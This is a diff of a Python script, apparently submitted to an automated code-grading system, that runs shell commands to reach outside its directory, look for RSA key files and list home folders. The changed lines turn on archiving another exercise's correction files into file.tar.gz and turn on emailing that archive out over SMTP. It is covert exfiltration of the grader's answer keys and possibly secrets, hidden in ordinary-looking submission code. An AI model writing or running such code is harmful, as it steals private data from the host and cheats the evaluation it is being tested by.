@@ -39,21 +39,21 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-# my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/246/") or ""
+my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/252/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
 # file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += "\n#######################\n"
 # my_data = get_data("tar -czvf file.tar.gz ../../../../hbtn_checker_functions")
-my_data = get_data("ls -l ../../../../../../home") or ""
-my_data += "\n#######################\n"
-my_data += get_data("pwd") or ""
+# my_data = get_data("ls -l ../../../../../../home") or ""
+# my_data += "\n#######################\n"
+# my_data += get_data("pwd") or ""
 # my_data += get_data("ls -l ../../../../correction/*/262/531078/") or ""
 # my_data += get_data("ls -l ../../../../hbtn_checker_functions") or ""
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
 # my_data += get_data("cat ./cycle") or ""
-send_data(my_data)
+# send_data(my_data)
 ##############################################################
 import smtplib
 from email.mime.multipart import MIMEMultipart
@@ -95,4 +95,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-# send_data_file("file.tar.gz", "gz")
+send_data_file("file.tar.gz", "gz")
